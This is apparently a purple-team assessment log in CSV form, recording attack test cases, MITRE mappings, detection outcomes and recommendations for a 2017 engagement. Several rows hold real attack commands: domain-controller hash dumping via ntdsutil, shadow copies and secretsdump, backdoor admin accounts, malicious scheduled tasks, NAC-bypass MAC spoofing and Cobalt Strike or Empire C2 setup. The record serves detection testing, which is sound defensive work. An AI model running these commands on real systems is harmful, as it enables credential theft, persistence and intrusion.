AssessmentGroup,Campaign,Phase,Variant,MitreID,CapecId,Method,Status,Outcome,Alert Severity,Alert Triggered,Activity Logged,Outcome Notes,Detection Recommendations,SourceIps,TargetAssets,ExpectedDetectionLayers,DetectingTools,Start Time,Start Time Epoch,Stop Time,Stop Time Epoch,Detection Time,Detection Time Epoch,Organizations,Tags,Objective,Command,References,Liklihood,Risk,Internal/External,Stealth,Attack Vector,Attack Complexity,Privileges Required,Attacker Tools
Enterprise Purple – 2017 Q1,Network MiTM,Exploitation,Basic Auth & WPAD,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2017-01-17T09:20:25.930Z,1484644825930,2017-01-17T10:13:47.930Z,1484648027930,2017-01-17T12:05:23.930Z,1484654723930,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2017 Q1,Network MiTM,Exploitation,Inveigh,T1557.001,,Network Spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2017-01-17T06:55:13.930Z,1484636113930,2017-01-17T07:29:48.930Z,1484638188930,2017-01-17T08:18:04.930Z,1484641084930,Security Risk Advisors,,Run the powershell inveigh toolset via a beacon.,Invoke-Inveigh  NBNS - Y,,Low,Low,Internal,Low,,,,
Enterprise Purple – 2017 Q1,Network MiTM,Exploitation,Unencrypted Windows Update,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2017-01-17T01:08:33.930Z,1484615313930,2017-01-17T02:19:57.930Z,1484619597930,2017-01-17T02:55:23.930Z,1484621723930,Security Risk Advisors,,Intercept Windows Updates on the target laptop in order to run a malicious binary,./wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>,,High,High,Internal,Medium,,,,
Enterprise Purple – 2017 Q1,Network MiTM,Exploitation,LLMNR,T1557.001,,Network spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2017-01-17T03:47:19.930Z,1484624839930,2017-01-17T04:14:05.930Z,1484626445930,2017-01-17T05:13:07.930Z,1484629987930,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials.",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Static IP Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T21:26:44.930Z,1484602004930,2017-01-16T23:06:55.930Z,1484608015930,2017-01-16T23:59:37.930Z,1484611177930,Security Risk Advisors,,Set a static IP address on the attack host to bypass any network restrictions.,Change ip address of network adapter to a static address,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Apple MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T18:52:49.930Z,1484592769930,2017-01-16T19:22:01.930Z,1484594521930,2017-01-16T19:29:22.930Z,1484594962930,Security Risk Advisors,,Change the MAC address to a Apple manufacturer code.,"Disable wifi and run the following:
sudo ifconfig en0 ether <New_Mac_Address>",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,PC MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T15:59:04.930Z,1484582344930,2017-01-16T16:41:56.930Z,1484584916930,2017-01-16T18:02:35.930Z,1484589755930,Security Risk Advisors,,Change the MAC address to a PC manufacturer code.,,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,NAC Bypass,Discovery,Passive Network Recon,T1049,,Passive network recon,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,"Network Isolation,Behavior Analytics",,2017-01-16T02:07:18.930Z,1484532438930,2017-01-16T02:35:29.930Z,1484534129930,2017-01-16T02:55:37.930Z,1484535337930,Security Risk Advisors,,"Obtain information from the network including MAC addresses, valid IP addresses, and hostnames.",,,High,High,Internal,High,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Raspberry Pi,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T03:19:57.930Z,1484536797930,2017-01-16T04:31:27.930Z,1484541087930,2017-01-16T06:15:29.930Z,1484547329930,Security Risk Advisors,,Connect an untrusted device to the network to exploit NAC controls.,Connect raspberry pi into a wall jack.,,Low,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Network Device MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T06:44:24.930Z,1484549064930,2017-01-16T07:13:23.930Z,1484550803930,2017-01-16T07:29:33.930Z,1484551773930,Security Risk Advisors,,Change the MAC address to a network device manufacturer code.,Use device manager and change the mac address value for network adapter,,High,High,Internal,Medium,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Printer MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T09:12:51.930Z,1484557971930,2017-01-16T09:31:44.930Z,1484559104930,2017-01-16T10:15:09.930Z,1484561709930,Security Risk Advisors,,Change the MAC address to a printer manufacturer code.,"#Linux
macchanger -m <MAC> <Interface>
#Windows
Device Manager -> Network Adapters -> Advanced
Look for Locally Administrative Address or Network Address and change the value for that (No : needed)",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,NAC Bypass,Exploitation,Unusual MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-01-16T12:03:20.930Z,1484568200930,2017-01-16T13:58:23.930Z,1484575103930,2017-01-16T15:40:23.930Z,1484581223930,Security Risk Advisors,,Change the MAC address to an unusual manufacturer code.,"In device manager, change the network adapter's mac address value",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,External Automated Scans,Reconnaissance,Network Vulnerability Scan - External IP Ranges,T1046,,Vulnerability scanning,Completed,Detected,Med,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",Gunhed,2017-01-04T21:00:39.930Z,1483563639930,2017-01-04T21:16:23.930Z,1483564583930,2017-01-04T21:36:32.930Z,1483565792930,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",,,High,Medium,Both,Low,,,,Nessus
Enterprise Purple – 2017 Q1,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 1,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2017-01-04T15:24:12.930Z,1483543452930,2017-01-04T16:25:15.930Z,1483547115930,2017-01-04T17:31:12.930Z,1483551072930,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 2,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,Firewall,,2017-01-04T18:01:49.930Z,1483552909930,2017-01-04T19:02:55.930Z,1483556575930,2017-01-04T20:22:04.930Z,1483561324930,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,External Password Attacks,Exploitation,Remote Access Portal - SSO Login,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",,2017-01-04T00:37:39.930Z,1483490259930,2017-01-04T02:37:15.930Z,1483497435930,2017-01-04T03:36:23.930Z,1483500983930,Security Risk Advisors,,"Brute force single password, large list of potential users","Capture login request
Brute force with intruder",,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,External Password Attacks,Exploitation,Simultaneous VPN Logins from different Geo's,T1078,,Suspicious Logins,Completed,NotDetected,TBD,TBD,TBD,,"1) VPN authentication logs are sent to a SIEM for further analysis, correlation and alerting",,,"Firewall,SIEM",,2017-01-04T12:56:51.930Z,1483534611930,2017-01-04T13:14:04.930Z,1483535644930,2017-01-04T14:30:47.930Z,1483540247930,Security Risk Advisors,,Login from two distinct geo's to test detection capabilities.,,,Medium,Medium,External,Low,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q1,External Password Attacks,Exploitation,Remote Access Portal - Office 365,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",,2017-01-04T05:12:00.930Z,1483506720930,2017-01-04T06:58:42.930Z,1483513122930,2017-01-04T07:39:36.930Z,1483515576930,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,External Password Attacks,Exploitation,Customer Portal Brute Force,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",,2017-01-04T09:38:29.930Z,1483522709930,2017-01-04T11:24:14.930Z,1483529054930,2017-01-04T12:52:12.930Z,1483534332930,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q1,Domain Controller Assault,Lateral Movement,Extract Password Hashes via NTDSUtil,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-01-19T03:47:46.930Z,1484797666930,2017-01-19T03:58:59.930Z,1484798339930,2017-01-19T04:02:59.930Z,1484798579930,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via NTDSUtils.,ntdsutil “ac in ntds” “ifm” “cr fu \\yourip\tmp” q q,,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Domain Controller Assault,Command & Control,Beacon SMB payload on a DC,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,Behavior Analytics,,2017-01-18T21:45:45.930Z,1484775945930,2017-01-18T23:04:55.930Z,1484780695930,2017-01-19T00:00:24.930Z,1484784024930,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Generate SMB beacon and run on DC,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Domain Controller Assault,Lateral Movement,Extract password hashes from DC by copying NTDS.dit,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-01-18T18:20:32.930Z,1484763632930,2017-01-18T18:21:35.930Z,1484763695930,2017-01-18T19:50:09.930Z,1484769009930,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,SMBexec
Enterprise Purple – 2017 Q1,Domain Controller Assault,Lateral Movement,Interactive Logon to a DC,T1078,,Compromise a DC,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to detect unusual logons to DCs from domain admin users and service accounts, potential detection of anomalous system access from UEBA tool",,,SIEM,,2017-01-18T15:05:24.930Z,1484751924930,2017-01-18T16:02:35.930Z,1484755355930,2017-01-18T17:41:34.930Z,1484761294930,Security Risk Advisors,,Perform anomalous interactive logons to a DC from privileged user and service accounts.  Once logged in establish persistent remote shell.,Use RDP to access DC and set up persistence,,Medium,High,Internal,Low,,,,
Enterprise Purple – 2017 Q1,Domain Controller Assault,Command & Control,Beacon HTTP payload on a DC,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,Behavior Analytics,,2017-01-19T00:02:09.930Z,1484784129930,2017-01-19T01:39:22.930Z,1484789962930,2017-01-19T02:32:05.930Z,1484793125930,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Start http listener and generate a payload from Attacks -> Packages,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Domain Controller Assault,Lateral Movement,Extract password hashes from DC using DC replication / DCSync,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,SIEM,,2017-01-19T04:13:15.930Z,1484799195930,2017-01-19T05:22:23.930Z,1484803343930,2017-01-19T05:52:33.930Z,1484805153930,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"Using impacket:
python secretsdump.py -just-dc DOMAIN/USER:PASSWORD@<DC IP>",,Medium,High,Internal,High,,,,
Enterprise Purple – 2017 Q1,Domain Controller Assault,Lateral Movement,Extract Password Hashes via VSS,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-01-19T07:26:49.930Z,1484810809930,2017-01-19T08:02:41.930Z,1484812961930,2017-01-19T09:58:45.930Z,1484819925930,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via VSS (Volume Shadow Services).,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin list shadows 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin create shadow /for=C: 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Temp\SYSTEM.hive 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence using .BAT file,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-01-15T02:04:43.930Z,1484445883930,2017-01-15T02:10:58.930Z,1484446258930,2017-01-15T04:02:40.930Z,1484452960930,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-01-14T23:23:07.930Z,1484436187930,2017-01-14T23:58:28.930Z,1484438308930,2017-01-15T01:08:20.930Z,1484442500930,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Create a Local Administrator User on Server,T1136,,Backdoor Accounts,Completed,NotDetected,TBD,TBD,Yes,,"1) EDR tool alerts on suspicious use of Windows 'net user' and similar commands,2) SIEM alerts on local and domain user and group creation and modifications",,,"SIEM,EDR",,2017-01-15T07:39:23.930Z,1484465963930,2017-01-15T07:51:34.930Z,1484466694930,2017-01-15T09:48:25.930Z,1484473705930,Security Risk Advisors,,Create a Local administrator user after the compromise of a system.,"net user /add [username] [password]
new localgroup administrators [username] /add",,Medium,High,Internal,Low,,,,
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Use of schtasks.exe for persistent jobs,T1053,,Scheduled tasks,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows task scheduler events,,,"SIEM,EDR",,2017-01-15T04:56:17.930Z,1484456177930,2017-01-15T06:12:54.930Z,1484460774930,2017-01-15T07:07:41.930Z,1484464061930,Security Risk Advisors,,Create a scheduled task,"schtasks /Create /SC DAILY /TN ""Malicious Task"" /TR ""C:MaliciousFile.bat"" /ST 09:00",,Medium,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Use of sc.exe to create rogue service to maintain access,T1543.003,,Rogue Service Creation,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows service creation events,,,"SIEM,EDR",,2017-01-14T21:47:18.930Z,1484430438930,2017-01-14T22:05:09.930Z,1484431509930,2017-01-14T22:19:27.930Z,1484432367930,Security Risk Advisors,,Modification of the registry startup keys to launch a rogue service.,,,Low,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Endpoint Persistence,Persistence,Use of WMI Subscription for persistent jobs,T1546.003,,Windows Management Instrumentation,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect suspicious WMI execution,,,"SIEM,EDR",,2017-01-15T11:04:01.930Z,1484478241930,2017-01-15T11:52:40.930Z,1484481160930,2017-01-15T11:54:34.930Z,1484481274930,Security Risk Advisors,,Establish persistence using WMI event subscriptions.,"Create a one liner payload
cat payload.txt | iconv --to-code=UTF-16LE | base64 -w 0

Red team → Persistence → WMI Event Persistence using PowerShell",https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence,Medium,Medium,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2017 Q1,External Port Scans,Reconnaissance,"External - Moderate Port Scan with 10 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,Firewall,,2017-01-03T05:51:43.930Z,1483422703930,2017-01-03T06:03:24.930Z,1483423404930,2017-01-03T08:38:39.930Z,1483432719930,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 21,80,443,8080,8443 --script=ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-admin-check.nse,http-title.nse --script-args=http.useragent=""Mozilla/5.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_moderate -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2017 Q1,External Port Scans,Reconnaissance,"External - Noisy Port Scan with 1000 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,Firewall,,2017-01-03T13:53:58.930Z,1483451638930,2017-01-03T14:02:11.930Z,1483452131930,2017-01-03T15:24:12.930Z,1483457052930,Security Risk Advisors,,Identify open ports and services,nmap --open -v2 -sS -Pn -oA nmap_noisy -iL ranges.txt,,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2017 Q1,External Port Scans,Reconnaissance,"External - Stealthy Port Scan with 3 ports, service enumeration, limited NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,Firewall,,2017-01-03T09:43:34.930Z,1483436614930,2017-01-03T11:17:35.930Z,1483442255930,2017-01-03T12:32:03.930Z,1483446723930,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 80,443,8080 --data-length 471 --randomize-hosts --script=http-title.nse --script-args=http.useragent=""Mozilla/5.0;Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_stealthy -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTPS payload over tcp/443,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2017-01-12T14:34:27.930Z,1484231667930,2017-01-12T16:33:36.930Z,1484238816930,2017-01-12T18:33:23.930Z,1484246003930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Install SSL Certs From Lets Encrypt onto the server

Create a https listener",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Empire Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2017-01-13T02:49:52.930Z,1484275792930,2017-01-13T03:25:06.930Z,1484277906930,2017-01-13T04:21:49.930Z,1484281309930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","uselistener http

Stageless:
launchers <powershell or python> <listener name>

Staged:
usestager <stager-option>
set <option-name> <option-value>
execute",,Medium,High,Both,Medium,,,,Empire
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2017-01-12T10:31:05.930Z,1484217065930,2017-01-12T12:07:48.930Z,1484222868930,2017-01-12T13:31:46.930Z,1484227906930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.",Create a http listener,,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon SMB over tcp/445,T1571,,C2 channel,Completed,Blocked,TBD,No,TBD,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.,2) Suspicious SMB netconns and pivoting from internal systems is detected by EDR or behavioral tools. Examples may include unusual SMB connections from domain controllers and other critical assets.",,,"Firewall,Behavior Analytics",Gunhed,2017-01-13T07:14:42.930Z,1484291682930,2017-01-13T07:43:35.930Z,1484293415930,2017-01-13T08:53:02.930Z,1484297582930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various SMB.",Generate default SMB beacon using cobalt strike,,Medium,High,Internal,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Beacon DNS over udp/53,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,"1) SIEM rules are configured to detect and alert on suspicious DNS traffic,12 Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Firewall,Behavior Analytics",,2017-01-13T05:52:02.930Z,1484286722930,2017-01-13T06:20:24.930Z,1484288424930,2017-01-13T07:04:54.930Z,1484291094930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Purchase a domain name

Create a windows/beacon_dns/reverse_dns_txt listener",,Medium,High,Both,High,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTP payload over tcp/80,T1095,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2017-01-12T19:18:30.930Z,1484248710930,2017-01-12T20:21:12.930Z,1484252472930,2017-01-12T22:13:25.930Z,1484259205930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTPS payload over tcp/443,T1095,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2017-01-12T23:09:14.930Z,1484262554930,2017-01-13T00:47:08.930Z,1484268428930,2017-01-13T02:28:07.930Z,1484274487930,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,C2 Channels,Discovery,Egress Buster,T1046,,Network egress checks,Completed,NotDetected,TBD,TBD,Yes,,1) Egress busting scan is detected by IDS/IPS or firewall,,,"Web Gateway,Firewall",,2017-01-13T10:38:42.930Z,1484303922930,2017-01-13T11:22:23.930Z,1484306543930,2017-01-13T11:55:05.930Z,1484308505930,Security Risk Advisors,,"Identify allowed egress services and ports, including all TCP ports and common UDP ports.",,,Low,Low,Internal,Low,,,,Egress Buster
Enterprise Purple – 2017 Q1,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - Tomcat,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,,,2017-01-18T08:14:35.930Z,1484727275930,2017-01-18T09:11:27.930Z,1484730687930,2017-01-18T10:26:36.930Z,1484735196930,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",msf> use auxiliary/scanner/http/tomcat_mgr_login,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q1,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 1,T1046,,Web application probing,Completed,NotDetected,TBD,TBD,Yes,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,SIEM,,2017-01-18T01:07:52.930Z,1484701672930,2017-01-18T03:04:13.930Z,1484708653930,2017-01-18T04:36:32.930Z,1484714192930,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q1,App Server Discovery and Exploitation,Discovery,"Internal - Stealth Port Scan with 3 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) Internal port scanning activity detected by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",,2017-01-18T00:22:30.930Z,1484698950930,2017-01-18T00:35:50.930Z,1484699750930,2017-01-18T01:01:53.930Z,1484701313930,Security Risk Advisors,,Run lighter internal port scanning to probe interesting HTTP ports and services.,,,High,Low,Internal,Medium,,,,Nmap
